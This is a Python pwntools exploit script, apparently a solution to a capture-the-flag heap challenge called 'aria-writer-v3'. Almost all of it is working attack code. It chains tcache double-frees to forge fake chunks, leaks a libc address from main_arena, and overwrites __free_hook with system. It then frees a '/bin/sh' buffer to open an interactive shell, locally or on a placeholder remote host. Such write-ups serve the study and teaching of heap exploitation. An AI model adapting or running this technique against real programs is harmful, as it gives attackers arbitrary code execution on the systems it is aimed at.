#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


def malloc(p, size, buf):
    p.recvuntil(b"Gimme int pls >")
    p.sendline(b"1")
    p.recvuntil(b">")
    p.sendline(str(size))
    p.recvuntil(b"what should i write tho >")
    p.sendline(buf)

def free(p):
    p.recvuntil(b"Gimme int pls >")
    p.sendline(b"2")

if __name__ == '__main__':
    context.terminal = ['tmux', 'sp', '-h']
    context.log_level = "debug"

    chall = "./aria-writer-v3"
    libc = ELF("./libc.so.6")
    elf = ELF(chall)
    context.binary = chall
    context.binary.checksec()

    if len(argv) >= 2 and argv[1] == "r":
        p = remote("example.com", 4444)
    elif len(argv) >= 2 and argv[1] == "d":
    	cmd = """
    		c
            loadsym
            heap chunks 0x602040
    	"""
    	p = gdb.debug(chall,cmd)
    elif len(argv) >= 2 and argv[1] == "gdb":
        p = gdb.debug(chall,'c')
    else:
        p = process(chall)

    # fake chunk struct
    # +---------------------------+
    # | large chunk header (name) |
    # +---------------------------+
    # | large chunk (size=0x500)  |
    # +---------------------------+
    # |  little chunk 1 header    |
    # +---------------------------+
    # | little chunk 1 (size=0x20)|
    # +---------------------------+
    # |  little chunk 2 header    |
    # +---------------------------+
    # | little chunk 2 (size=0x20)|
    # +---------------------------+

    # name
    name = p64(0x501)# fake large chunk header
    p.recvuntil("whats your name")
    p.sendline(name)
    curr_addr = elf.symbols['curr']
    name_addr = curr_addr + 0x8
    # making fake chunk(1)
    fake_chk_addr = curr_addr + 0x500
    size = 0x20
    malloc(p, size, 'DUMMY')
    free(p)
    free(p)
    malloc(p, size, p64(fake_chk_addr))
    malloc(p, size, 'DUMMY')
    malloc(p, size, p64(0)+p64(0x21))
    log.info("made little chunk(1): 0x{:06x}".format(fake_chk_addr))
    # making fake chunk(2)
    fake_chk2_addr = fake_chk_addr + 0x20
    size = 0x30
    malloc(p, size, 'DUMMY')
    free(p)
    free(p)
    malloc(p, size, p64(fake_chk2_addr))
    malloc(p, size, 'DUMMY')
    malloc(p, size, p64(0)+p64(0x21))
    log.info("made little chunk(2): 0x{:06x}".format(fake_chk2_addr))
    # free large chunk (name == head, size = 0x500)
    size = 0x40
    malloc(p, size, 'DUMMY')
    free(p)
    free(p)
    malloc(p, size, p64(name_addr + 0x8))
    malloc(p, size, 'DUMMY')
    malloc(p, size, 'DUMMY')
    free(p)
    log.info("freed large chunk: 0x{:06x}".format(name_addr + 0x8))
    # removal null in the large chunk header
    size = 0x50
    malloc(p, size, 'DUMMY')
    free(p)
    free(p)
    malloc(p, size, p64(name_addr))
    malloc(p, size, 'DUMMY')
    malloc(p, size, 'A' * 0x8 + 'B' * 0x8)
    # receive libc address
    p.recvuntil("BBBBBBBB")
    leak = u64(p.recv(6) + b'\00\00')
    log.info("main_arena+970: 0x{:06x}".format(leak))
    libc_base = leak - 0x3ebc40 - 970
    log.info("libc base: 0x{:06x}".format(libc_base))
    # get a shell !
    size = 0x60
    malloc(p, size, 'DUMMY')
    free(p)
    free(p)
    malloc(p, size, p64(libc.symbols['__free_hook']+libc_base))
    malloc(p, size, 'DUMMY')
    malloc(p, size, p64(libc.symbols['system']+libc_base))
    size = 0x70
    malloc(p, size, '/bin/sh')
    free(p)

    p.interactive()
